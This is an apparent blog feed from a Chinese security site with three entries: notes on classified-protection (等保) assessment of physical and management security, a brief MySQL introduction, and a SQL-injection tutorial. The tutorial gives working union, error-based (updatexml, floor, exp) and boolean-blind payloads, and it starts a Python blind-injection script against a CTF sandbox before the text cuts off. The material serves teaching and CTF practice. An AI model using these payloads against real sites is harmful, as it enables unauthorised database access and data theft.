      <url>2020/08/27/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%E4%B9%8B%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E3%80%81%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.ex1t.xyz/wp-content/uploads/2020/08/u38794416892821884868fm26gp0-300x207.jpg"></p><h1 id="测评方法"><a href="#测评方法" class="headerlink" title="测评方法"></a>测评方法</h1><h2 id="测评工具"><a href="#测评工具" class="headerlink" title="测评工具"></a>测评工具</h2><ul><li>安全管理测评指导书</li><li>安全物理环境测评作业指导书<h2 id="作业指导书开发基本步骤"><a href="#作业指导书开发基本步骤" class="headerlink" title="作业指导书开发基本步骤"></a>作业指导书开发基本步骤</h2></li><li>第一步：从《基本要求中》选择‘控制点’（测评指标）和要求项（测评项）</li><li>第二步：从《测评要求》中选择”测评方法“</li><li>第三步：结合信息系统实际情况调整”测评方法“</li><li>第四步最终形成作业指导书<h2 id="测评方式"><a href="#测评方式" class="headerlink" title="测评方式"></a>测评方式</h2></li><li>访谈</li><li>核查<h2 id="核查与访谈的关系"><a href="#核查与访谈的关系" class="headerlink" title="核查与访谈的关系"></a>核查与访谈的关系</h2></li><li> 通过访谈获得肯定的答案，通过核查验证访谈结果。<h2 id="访谈技巧访谈技巧"><a href="#访谈技巧访谈技巧" class="headerlink" title="访谈技巧访谈技巧"></a>访谈技巧访谈技巧</h2></li><li>基于作业指导书开展</li><li>访谈对象的选择，覆盖适当的层次和职能；</li><li>访谈应在正常的工作时间和工作地点</li><li>说明访谈和做记录的原因</li><li>访谈可以从请对方描述工作开始</li><li>尽量避免有倾向性答案的问题</li><li>感谢对方配合<h2 id="问题问题"><a href="#问题问题" class="headerlink" title="问题问题"></a>问题问题</h2></li><li>开放式和非开放式<h2 id="核查核查"><a href="#核查核查" class="headerlink" title="核查核查"></a>核查核查</h2></li><li>是指测评人员通过对测评对象进行观察、查验、分析等活动，获取证据以证明其安全保护措施是否有效的一种方法<h2 id="核查对象核查对象"><a href="#核查对象核查对象" class="headerlink" title="核查对象核查对象"></a>核查对象核查对象</h2></li><li>各类文件-制度文档</li><li>操作规程-执行记录</li><li>物理环境-基础础设施<h1 id="安全管理测评流程"><a href="#安全管理测评流程" class="headerlink" title="安全管理测评流程"></a>安全管理测评流程</h1><h2 id="基本活动基本活动"><a href="#基本活动基本活动" class="headerlink" title="基本活动基本活动"></a>基本活动基本活动</h2></li><li>核查是否存在有关的规定、制度或规程文档；</li><li>核查文档的描述细节是否设计相关的内容；</li><li>核查是否存在有关执行过程的记录文件或说明文件（证据）</li><li>核查文件的记录内容是否与规定、制度或规程要求一致；</li><li>访谈相关人员，要求其对描述不理解或者记录不理解内容的解释或说明</li><li>访谈相关人员，要求其对管理过程或执行过程解释和说明。<h2 id="测评流程测评流程"><a href="#测评流程测评流程" class="headerlink" title="测评流程测评流程"></a>测评流程测评流程</h2></li><li>第一步，根据现场配合人员名单，进一步明确协调人员、访谈人员及时间</li><li>第二步，根据检查文档列表，获得制度、记录、规程等各类文档，并填写文档交接单；</li><li>第三步，审阅各类文档，并在现场测评作业指导书的相关项中进行结果记录</li><li>第四步，针对不确定项访谈相关人员或获得额外证据并记录；</li><li>第五步，整理作业指导书的结果记录，并确认签字</li><li>第六步，归还所有文档，并在文档交接单中签字。<h1 id="安全物理环境测评流程"><a href="#安全物理环境测评流程" class="headerlink" title="安全物理环境测评流程"></a>安全物理环境测评流程</h1><h2 id="基本活动基本活动-1"><a href="#基本活动基本活动-1" class="headerlink" title="基本活动基本活动"></a>基本活动基本活动</h2></li><li>实地察看场地条件、环境条件是否符合要求</li><li>实地察看设备、设施是否工作正常</li><li>实地查看是否存在有关设备、设施、标签、标识等；</li><li>核查设备、设施的检查报告或维护日志、核查机房设计验收文档</li><li>访谈相关人员，要求对不理解之处进行解释说明；</li><li>访谈相关人员，要求对管理过程或执行过程补充解释和说明<h2 id="测评流程测评流程-1"><a href="#测评流程测评流程-1" class="headerlink" title="测评流程测评流程"></a>测评流程测评流程</h2></li><li>第一步，针对安全物理环境的测评项访谈相关人员</li><li>第二步，实地查看场地、环境条件以及设备、设施运行状态；</li><li>第三步，实地查看存在的有关设备、设施运行状态；</li><li>第四步，检查检测报告或维护日志、检查机房设计验收文档（可在进机房前完成）；</li><li>第五步，针对不确定项访谈相关人员；</li><li>第六步，整理作业指导书，整理结果记录并确认签字<h2 id="测评要点测评要点"><a href="#测评要点测评要点" class="headerlink" title="测评要点测评要点"></a>测评要点测评要点</h2></li><li>机房、建筑的各类设计/验收文档（机房位置选择说明、机房建筑承受能力、机房建筑防雷、机房综合布线及接地、自动消防系统、机房防火和新风系统、电力供应和电磁防护等）；</li><li>机房配备电子门禁系统、分区管理、登录记录、专人陪同；</li><li>设备和线路贴不易去除标识；</li><li>设置专人值守的视频监控系统或机房报警系统；</li><li>电源线和信号线上的防雷措施（光纤接入除外）</li><li>自动消防报警系统运行状态、手提式或便携式灭火器的摆放位置及有效期、消防演习记录</li><li>机房天花板及墙壁是否存在防潮及结露现象，机房屋顶或活动办下面是否有水管、对为开放窗户的防雨措施；</li><li>机房空调温度显示、机房日常巡检温度记录；</li><li>双路师电接入、ups满负荷时最大负载、备用供电系统，电力供应应急演练记录。<h2 id="测评难点测评难点"><a href="#测评难点测评难点" class="headerlink" title="测评难点测评难点"></a>测评难点测评难点</h2></li><li>机房防盗报警系统</li><li>机房区域防火隔离</li><li>双路市电供电或备用供电系统。<h2 id="安全物理环境测评注意事项"><a href="#安全物理环境测评注意事项" class="headerlink" title="安全物理环境测评注意事项"></a>安全物理环境测评注意事项</h2></li><li>事项一：现场查看机房基础设施建设情况时，设施的有无并不能反映落实与否，关键查看设施是否有效的、正常运行；</li><li>事项二：当机房根据用途不同分为多个房间，处于不同位置时，各个机房应按相关的物理要求分别检查。<h1 id="安全管理制度"><a href="#安全管理制度" class="headerlink" title="安全管理制度"></a>安全管理制度</h1><h2 id="测评要点"><a href="#测评要点" class="headerlink" title="测评要点"></a>测评要点</h2></li><li>总体方针政策文件、各类管理制度、各种操作规范及记录表单四类文档；</li><li>四类文档间的连贯性、完备性以及管理制度的覆盖面</li><li>管理制度文件格式、版本、装订记录、各种评审记录以及发放等级记录；</li><li>制定和修订方面的文字具体要求，修订计划，修订流程；</li><li>安全管理制度、修订的责任人、具体制定、发布流程。<h2 id="管理制度文件体系管理制度文件体系"><a href="#管理制度文件体系管理制度文件体系" class="headerlink" title="管理制度文件体系管理制度文件体系"></a>管理制度文件体系管理制度文件体系</h2></li><li>第一层 安全方针政策  信息啊暖方针政策，总体安全，说明机构安全工作的总体目标、范围、原则和安全框架等</li><li>第二层 安全管理制度 对安全管理活动中的各类管理建立安全制度管理，约束管理行为。</li><li>第三层 技术标准、规范 安全管理制度的具体技术实现细节，对管理人员或者操作人员的日常管理操作建立操作规程</li><li>第四层 流程、表单、记录 安全制度、规范实施所需履行的流程，及需填写的表单，用于记录数据、监控实施。<h2 id="测评难点测评难点-1"><a href="#测评难点测评难点-1" class="headerlink" title="测评难点测评难点"></a>测评难点测评难点</h2></li><li>安全方针、管理制度、操作规程以及记录表单四类文件形成管理制度文件体系；</li><li>管理制度定期的评审、修订、完善。</li><li>安全管理机构<h2 id="测评要点测评要点-1"><a href="#测评要点测评要点-1" class="headerlink" title="测评要点测评要点"></a>测评要点测评要点</h2></li><li>查看岗位职责文件了解：安全管理组织构成情况，信息安全领导小组-信息安全管理工作的职能部门-具体岗位，具体职责分工情况；</li><li>机构人员及岗位人员配备情况(如安全管理员、系统管理员、网络管理员、审计员）；</li><li>根据岗位人员配备名单了解安全管理员是否时专职人员，其它岗位人员配备情况。</li><li>审批事项、审批部门、批准人及审批程序等（制度），审批过程实际执行记录，了解授权和审批情况；</li><li>沟通和合作情况，了解部门内外沟通和合作情况，各类会议纪要、外协单位联系档案等；</li><li>安全检查周期、内容、程序等，各类安全检查表格、以往安全检查记录或总结了解对信息系统的安全检查情况。<h2 id="测试难点测试难点"><a href="#测试难点测试难点" class="headerlink" title="测试难点测试难点"></a>测试难点测试难点</h2></li><li>网络安全领导小组或网络安全管理委员会的发布文件或授权文件；</li><li>专职安全管理员</li><li>对重要活动的逐级审批制度</li><li>定期的全面安全检查<h1 id="安全管理人员"><a href="#安全管理人员" class="headerlink" title="安全管理人员"></a>安全管理人员</h1><h2 id="测评要点测评要点-2"><a href="#测评要点测评要点-2" class="headerlink" title="测评要点测评要点"></a>测评要点测评要点</h2></li><li>录用、离岗、安全意识教育和培训方面的管理要求；</li><li>安全保密协议和关键岗位的安全协议；</li><li>离岗交接记录；</li><li>安全技能考核记录</li><li>培训计划和培训记录</li><li>外部人员访问方面的管控措施<h2 id="测评难点测评难点-2"><a href="#测评难点测评难点-2" class="headerlink" title="测评难点测评难点"></a>测评难点测评难点</h2></li><li>关键岗位人员的社会背景审查，关键岗位安全协议</li><li>安全技能和安全认知的考核</li><li>对外部人员允许访问的区域、系统、设备、信息等内容的详细书面规定。<h1 id="安全建设管理"><a href="#安全建设管理" class="headerlink" title="安全建设管理"></a>安全建设管理</h1><h2 id="测评要点测评要点-3"><a href="#测评要点测评要点-3" class="headerlink" title="测评要点测评要点"></a>测评要点测评要点</h2></li><li>测评对象的定级报告、备案证书；</li><li>测评对象的安全保护等级与其它级别保护对象关系的整体规划方案；</li><li>安全设计方案、工程实施方案</li><li>软件开发、产品采购、工程实施、测试验收、系统交付等方面的管控措施；</li><li>过程控制记录、各个阶段产品评审记录、测试验收报告；与服务供应商签订的保密协议或安全责任书。<h2 id="测评难点测评难点-3"><a href="#测评难点测评难点-3" class="headerlink" title="测评难点测评难点"></a>测评难点测评难点</h2></li><li>对主要的活动均需要遵循制度要求，规范化地执行各种活动，留有记录文件；</li><li>外包开发软件安装前的恶意代码检测和后门程序审查。<h1 id="安全运维管理"><a href="#安全运维管理" class="headerlink" title="安全运维管理"></a>安全运维管理</h1><h2 id="环境管理"><a href="#环境管理" class="headerlink" title="环境管理"></a>环境管理</h2></li><li>指定专门的部门或者人员负责机房安全</li><li>机房安全管理制度，机房基础设施定期维护记录、机房进出登记记录；</li><li>重要的区域安全管理<h2 id="资产管理"><a href="#资产管理" class="headerlink" title="资产管理"></a>资产管理</h2></li><li>编制与保护对象相关事务资产清单；</li><li>根据资产清单以及重要程度，经行标识和选择相应的管理措施；</li><li>对信息分类标识的原则和方法进行说明的文档<h2 id="介质管理"><a href="#介质管理" class="headerlink" title="介质管理"></a>介质管理</h2></li><li>介质本地、异地存储环境条件，分类和标识；</li><li>介质物理传输过程进行控制，并对查询和归档进行等级。<h2 id="设备维护管理"><a href="#设备维护管理" class="headerlink" title="设备维护管理"></a>设备维护管理</h2></li><li>指定设备万里负责人或负责部门</li><li>建立配套设施、软硬件维护方面的管理制度</li><li>设备带离机房或者办公环境的管控措施</li><li>含有存储介质的设备在报废或重用前，应进行完全的清除或被安全覆盖。<h2 id="漏洞和风险管理"><a href="#漏洞和风险管理" class="headerlink" title="漏洞和风险管理"></a>漏洞和风险管理</h2></li><li>采取必要的措施识别安全漏洞和隐患，采取相应的控制手段和措施；</li><li>应定期开展安全测评，采取措施应对测评发现的安全问题。<h2 id="网络和系统安全管理"><a href="#网络和系统安全管理" class="headerlink" title="网络和系统安全管理"></a>网络和系统安全管理</h2></li><li>应划分不同的管理员角色进行网络和系统的运维管理</li><li>应建立网络和系统方面的安全管理制度、操作手册、规程；</li><li>日常工作，包括本地用户和远程用户的访问管理、网络接入管理、网络设备管理、漏洞扫描、网络状态监控、检测和报警、账户管理、角色权限管理、补丁管理、日志或审计信息分析、日常维护等；</li><li>应严格控制变更性运维（运维工具、运程运维的开通）<h2 id="恶意代码防范管理"><a href="#恶意代码防范管理" class="headerlink" title="恶意代码防范管理"></a>恶意代码防范管理</h2></li><li>提高所有用户的恶意代码防范意识，对外来计算机或存储设备接入需进行检查</li><li>应定期验证防范恶意代码攻击的技术措施的有效性<h2 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h2></li><li>应记录和保存基本配置信息，如网络拓扑结构、各设备安装的软件组件、版本、配置参数等；</li><li>基本配置信息改变纳入变更范畴，实施对配置信息改变进行控制并及时更新。<h2 id="密码管理"><a href="#密码管理" class="headerlink" title="密码管理"></a>密码管理</h2></li><li>应遵循密码相关国家标准和行业标准</li><li>使用密码主管部门认证核准的密码技术产品。<h2 id="变更管理"><a href="#变更管理" class="headerlink" title="变更管理"></a>变更管理</h2></li><li>应明确变更控制策略；</li><li>应建立变更的申报和审批控制程序</li><li>变更审批记录</li><li>变更后相关的管理制度和操作规程的变化</li><li>失败变更的恢复文件化程度及恢复过程的演练记录<h2 id="备份和恢复管理"><a href="#备份和恢复管理" class="headerlink" title="备份和恢复管理"></a>备份和恢复管理</h2></li><li>识别需要定期备份的重要业务信息、数据、系统等</li><li>备份和恢复的策略文档及操作规程，如备份方式、频度、介质、保存周期等；</li><li>数据的备份策略和恢复策略以及备份程序和恢复程序；</li><li>备份介质的有效性检查记录。<h1 id="安全事件处理"><a href="#安全事件处理" class="headerlink" title="安全事件处理"></a>安全事件处理</h1></li><li>应及时向安全管理部门报告所发现的安全弱点和可疑事件；</li><li>安全事件报告和处置管理制度，包括安全事件定义、定级、报告流程、不同事件的响应和处置流程；</li><li>安全事件处置过程的记录</li><li>应急预案管理</li><li>应急预案总体框架</li><li>各类主要事件的具体应急预案；</li><li>应急预案涉及人员、设备等的资源满足情况</li><li>应急预案的培训记录、演练记录。<h2 id="外包运维管理"><a href="#外包运维管理" class="headerlink" title="外包运维管理"></a>外包运维管理</h2></li><li>外包运维服务商的选择符合规定；</li><li>签订协议，明确外包运维范围、工作内容、明确相关安全要求；</li><li>在技术方面和管理方面均具有按照等级保护要求开展运维工作能力。<h2 id="测评难点"><a href="#测评难点" class="headerlink" title="测评难点"></a>测评难点</h2></li><li>重要区域的安全管理</li><li>信息分类标识的原则和方法；</li><li>重要介质中数据或软件的加密存储；</li><li>安全审计的集中管理；</li><li>定期的网络和系统的漏洞扫描</li><li>对移动时、便携式设备接入网络安全管理</li><li>对违规联网行为的管理。</li><li>系统运行日志和审计数据分析</li><li>系统角色权限的划分和管理</li><li>变更失败的文件化恢复程序，变更失败的恢复演练</li><li>变更后对相关制度和操作规程修订</li><li>数据恢复或系统切换操作记录，备份介质的有效性检查；</li><li>信息安全事件的应急预案，应急预案培训和演练；</li><li>应急预案文档的维护和更新<h2 id="安全管理测评注意事项"><a href="#安全管理测评注意事项" class="headerlink" title="安全管理测评注意事项"></a>安全管理测评注意事项</h2></li><li>事项一：系统某控制点或某条要求不适合该级别的基本要求（如外包开发、自行软件开发）；一定不要滥用“不适用”若果某条没达到要求，由于下面一条要求预期是有关联关系，那么这条要求不能说不适用而是不符合。或者说只能由不是用推到到不适用，而不能由不符合推到为不适用</li><li>事项二、当访谈结果与检查结果不一致，应综合分析，不能片面采信任一方。</li><li>事项三:访谈以具体对象展开，而不以控制点或要求展开;</li><li>事项四:访谈是获得证据不可或缺的手段，但往往访谈回答信息的客观性、准确性，依被访谈角色对相关内容了解程度、以及双方的有效沟通而定，因此需要测评人员正确引导和判断;</li><li>事项五:在检查文档时发现不同文档针对同一方面内容要求不一致，应分析原因，结合其他测评方式所获证据来判断;事项六:所检查的文档应是机构目前已正式发布实施的有效文档;</li><li>事项七:制度文档的审阅一方面要检查制度文档的规范内容，另外应通过审阅记录文档检查制度文档的落实，若二者存在不致，应进一步寻找证据，最终确认是制度未得到有效落实还是制度文档需要修订有效落实还是制度文档需要修订;</li><li>事项八:其他测评项获取的证据，也可能会成为某一测评项判定的依据;</li><li>事项九:当由于某种原因机构无法提供原有的所要求的证据时其他证据效力等同时，可采纳;</li><li>事项十:文档名称可能不同，需进一步确认文档具体内容。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 等保测评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql数据库学习笔记之数据库及MySQL基础</title>
      <link href="2020/08/27/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8Asql%E5%9F%BA%E7%A1%80/"/>
      <url>2020/08/27/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8Asql%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p><img src="%22http://img.ex1t.xyz/20201230175643.jpg%22"></p><h2 id="数据库及SQL-MySQL基础"><a href="#数据库及SQL-MySQL基础" class="headerlink" title="数据库及SQL/MySQL基础"></a>数据库及SQL/MySQL基础</h2><h3 id="1-啥是数据库"><a href="#1-啥是数据库" class="headerlink" title="1.  啥是数据库???"></a>1.  啥是数据库???</h3><p>说的通俗一点，数据库就像粮仓一样，粮仓的作用是用来管理和存储粮食，那么数据库就是用来存储和管理数据。</p><h4 id="1-1-数据库的优点"><a href="#1-1-数据库的优点" class="headerlink" title="1.1 数据库的优点"></a>1.1 数据库的优点</h4><ol><li>可存储大量的数据；</li><li>十分方便检索</li><li>可以保持数据的一致性和完整性；</li><li>安全、可共享；</li><li>可以通过组合分析的手段产生新的数据。<h4 id="1-2-数据库的发展历程"><a href="#1-2-数据库的发展历程" class="headerlink" title="1.2 数据库的发展历程"></a>1.2 数据库的发展历程</h4></li></ol><p>下面即将进入数据库的第一个发展历程：<br><img src="http://img.ex1t.xyz/20201230175833.jpg"><br>程序员压力大呀</p><ol><li>人工管理数据：</li><li>数据不保存；</li><li>数据需要应用程序自己管理，没有相应的软件系统来负责数据的管理工作，比较麻烦；</li><li>数据不可共享；</li><li>数据布局有独立性，数据的逻辑结构或物理结构发生变化后，就需要对相应的程序作出相应的更改，这就有加大了程序员的负担。<br>第二个发展历程：<br><img src="http://img.ex1t.xyz/20201230175845.jpg"><br>对此面无表情</li></ol><ul><li>文件系统：</li></ul><ol><li>数据可以长期保存了</li><li>由专门的软件即文件系统进行数据管理，程序和数据之间由软件提供的存取方法进行转换，使应用程序与数据之间有了一定的独立性，程序和数据间有了独立性，程序员们可以解放了，可以将精力集中于算法上了。</li><li>数据共享性差</li><li>数据独立性低<br>即将到达现代；<br><img src="http://img.ex1t.xyz/20201230175857.png"><br>解放啦</li></ol><ul><li>数据库系统阶段：</li></ul><ol><li>数据结构化；</li><li>数据共享好，冗余度低</li><li>数据独立性高</li><li>数据又DBMS统一管理和控制<h3 id="常见的数据库有哪些呢？"><a href="#常见的数据库有哪些呢？" class="headerlink" title="常见的数据库有哪些呢？"></a>常见的数据库有哪些呢？</h3></li></ol><ul><li>Oracle；（甲骨文）</li><li>DB2；（IBM）</li><li>SQL server；（微软）</li><li>Sybase；（塞尔斯）</li><li>MySQL；（甲骨文）<br>#亲们，前面是数据库名，后面是数据库的厂商哈。<h3 id="我们该怎样理解数据库呢？"><a href="#我们该怎样理解数据库呢？" class="headerlink" title="我们该怎样理解数据库呢？"></a>我们该怎样理解数据库呢？</h3></li></ul><p>我们常见的数据</p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞大总结1-SQL注入</title>
      <link href="2020/07/30/%E6%BC%8F%E6%B4%9E%E5%A4%A7%E6%80%BB%E7%BB%931-sql%E6%B3%A8%E5%85%A5/"/>
      <url>2020/07/30/%E6%BC%8F%E6%B4%9E%E5%A4%A7%E6%80%BB%E7%BB%931-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><h1 id="漏洞大总结1-SQL注入——-诚默"><a href="#漏洞大总结1-SQL注入——-诚默" class="headerlink" title="漏洞大总结1-SQL注入—— 诚默"></a>漏洞大总结1-SQL注入—— 诚默</h1><blockquote><p>攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作,这个就是SQL注入。</p></blockquote><h3 id="1、什么是注入"><a href="#1、什么是注入" class="headerlink" title="1、什么是注入"></a>1、什么是注入</h3><h4 id="1-1-首先要了解注入的原理"><a href="#1-1-首先要了解注入的原理" class="headerlink" title="1.1 首先要了解注入的原理"></a>1.1 首先要了解注入的原理</h4><p>就比如前端查询用户id得到用户的数据<br>        id=传入的值<br>后台定义的语句如下</p><pre><code>    `date=select * from  user where id=传入的值`    `return date`</code></pre><p>原本正常用户输入的值应当是1、2、3<br>但是恶意用户可以输入<code> -1 or 1=1</code>  获得全部的用户数据<br>或输入 -1 union select user()   通过联合查询获取当前用户</p><h4 id="1-2-分类"><a href="#1-2-分类" class="headerlink" title="1.2 分类"></a>1.2 分类</h4><ol><li>有回显的注入<ul><li>联合注入<ul><li>整数注入</li><li>字符注入</li><li>搜索注入</li></ul></li><li>报错注入</li></ul></li><li>没有回显的注入<ul><li>布尔注入</li><li>时间盲注</li></ul></li><li>二次注入</li></ol><p>所以仔细分下来<strong>联合注入（整数、字符、搜索）、报错注入、布尔注入、时间盲注、二次注入</strong></p><h4 id="1-3-漏洞利用"><a href="#1-3-漏洞利用" class="headerlink" title="1.3 漏洞利用"></a>1.3 漏洞利用</h4><h5 id="1-3-1-联合注入"><a href="#1-3-1-联合注入" class="headerlink" title="1.3.1 联合注入"></a>1.3.1 联合注入</h5><p>使用联合注入的场景一般为数据库查询的数据会回显到页面<br>其中分为整数注入、字符注入、搜索注入<br>分为这几种也是获取的数据类型或功能不同，<br>后台代码大致如下</p><ul><li><p>整数注入后台代码<br><code>date=select * from  user where id=前台传输的数据</code></p></li><li><p>字符注入后台代码<br><code>date=select * from  user where id='前台传输的数据'</code></p></li><li><p>搜索注入<br><code>date=select * from user  where name like '%前台传输的数据%'</code></p></li></ul><p>所以要查询当前用户，需要使用不同的数据<br>由于后台得到的数据会进行字符化处理，我们使用单引号来引起提前闭合，所以需要使用注释符（#或–）来注释最后一个单引号。<br>注意的是，注释符后面还需要加个空格。</p><ul><li><p>整数注入：id=-1 union select user()</p><p>  <code>date=select * from  user where id=-1 union select user()</code></p></li><li><p>字符注入：id=-1’ union select user() – </p><p>  <code>date=select * from  user where id='-1' union select user() -- '</code></p></li><li><p>搜索注入：name=%’ union select user() – </p><p>  <code>date=select * from user  where name like '%%' union select user() -- %'</code></p></li></ul><p>获取所有数据</p><ul><li><p>整数注入：id=1 or 1=1</p><p>  <code>date=select * from  user where id=-1 or 1=1</code></p></li><li><p>字符注入：id=’ or ‘1’=’1</p><p>  <code>date=select * from  user where id='' or '1'='1'</code></p></li><li><p>搜索注入：name=%‘ or ‘%’=’</p><p>  <code>date=select * from  user where id='%%' or '%'='%'</code></p></li></ul><p>对联合注入先就说到这里</p><h5 id="1-3-2-报错注入"><a href="#1-3-2-报错注入" class="headerlink" title="1.3.2 报错注入"></a>1.3.2 报错注入</h5><blockquote><p>报错注入分为<strong>updatexml</strong>、<strong>floor</strong>和<strong>exp</strong></p></blockquote><h6 id="平时用的最多的是updatexml"><a href="#平时用的最多的是updatexml" class="headerlink" title="平时用的最多的是updatexml"></a>平时用的最多的是<strong>updatexml</strong></h6><p><code>UPDATEXML (XML_document, XPath_string, new_value);</code></p><ol><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li></ol><p><strong>作用：</strong> 改变文档中符合条件的节点的值　<br>concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出用户<br>0x7e ASCII码,实为~,upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母丢失,开头连接一个特殊字符~ </p><p><strong>eg:</strong></p><ul><li>concat(‘m’,’y’)=my</li><li>concat中的sql语句可以被执行</li><li>concat执行sql注入语句，再利用updatexml的报错信息返回sql语句执行结果</li><li>updatexml第二个参数必须是字符串吧，所以才需要借助返回值为字符串的concat函数。</li><li>1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<pre><code>  查询当前用户</code></pre></li></ul><h6 id="再说floor"><a href="#再说floor" class="headerlink" title="再说floor"></a>再说floor</h6><p>报错的原理是<strong>rand</strong>和<strong>ordery by</strong>或<strong>group by</strong>的冲突<br><code>select count(*) from test group by floor(rand(0)*2);</code><br>因为 rand 函数的特殊性（如果使用rand()的话，该值会被计算多次）<br>group by 进行分组时，<strong>floor(rand(0)*2)**执行一次（查看分组是否存在），如果虚拟表中不存在该分组，那么在插入新分组的时候 **floor(rand(0)*2)</strong> 就又计算了一次。（其实在上述 rand(0) 产生多个数据的时候，也能观察出来。只要 rand(0) 被调用，一定会产生新值）。<br>rand是伪随机。<br>所以*<em>floor(rand(0)<em>2)</em></em>值依此是011011001<br>当 group by 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，*<em>floor(rand(0)<em>2)</em></em>再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后floor(rand(0)*2)又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?id=1'+and(    select 1 from (select count(*),concat((select (         select (select concat(0x7e,version(),0x7e                                                    )                                            ))                                            from infomatioon_shcema.tables limt 0,1                    )floor(rand(0)*2)) x from information_schema.tables group by x)a)%23 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>%23是注释符#的url编码</p><h6 id="exp函数报错"><a href="#exp函数报错" class="headerlink" title="exp函数报错"></a>exp函数报错</h6><p>本质是溢出报错<br>exp是以e为底的指数函数，<br>但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。<br>~是取反符<br>我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。<br><code>?id=1' and exp(~(  select * from (select user()   )x))%23</code></p><h5 id="1-3-3-布尔注入"><a href="#1-3-3-布尔注入" class="headerlink" title="1.3.3 布尔注入"></a>1.3.3 布尔注入</h5><p>由于开发者将报错信息屏蔽导致，但是网页对于真假有不同的回显<br>只显示你当前的条件是否正确或者错误，例如我们判断字段数 order by 2返回正确，order by 3返回错误<br>一般经常使用的函数有以下几种分类</p><ol><li>截取函数</li></ol><ul><li>substr()</li><li>left()</li><li>right()</li></ul><ol start="2"><li>转换函数</li></ol><ul><li>ascii（）将字符串转换为ascii码</li><li>hex（）将字符串的值转换为16进制的值</li><li>面对布尔盲注，我们想要获取自己想知道的信息时，需要判断信息的每一位的ASCII码，对于返回的信息是否正确，直接观察页面的返回正常与否即可,虽然可以手动判断，但是花费时间过长，但是我使用常规的盲注脚本发现没有出现正常结果。<br>到<code>and 1=1</code>和<code>and 1=2</code>返回的都是success，所以我们使用<code>if(expr1,expr2,expr3)</code>函数来盲注<br>具体脚本</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://challenge-b4f28550822194be.sandbox.ctfhub.com:10080/?id='</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#0-3,假设四条记录，第i条开始</span>    name<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token string">'0123456789zaqwsxedcrfvtgbyhnujmikolp_'</span><span class="token punctuation">:</span><span class="token comment">#判断字符</span>            test_url<span class="token operator">=</span>url<span class="token operator">+</span>             '<span class="token keyword">if</span>    <span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token operator">%</span>d<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>d<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token operator">=</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables<span class="token punctuation">)</span>    <span class="token punctuation">)</span>'    <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span>  <span class="token comment">#分别是第i条记录，第j个字符，k字符</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>test_url<span class="token punctuation">)</span>    rep<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>test_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'query_success'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        name<span class="token 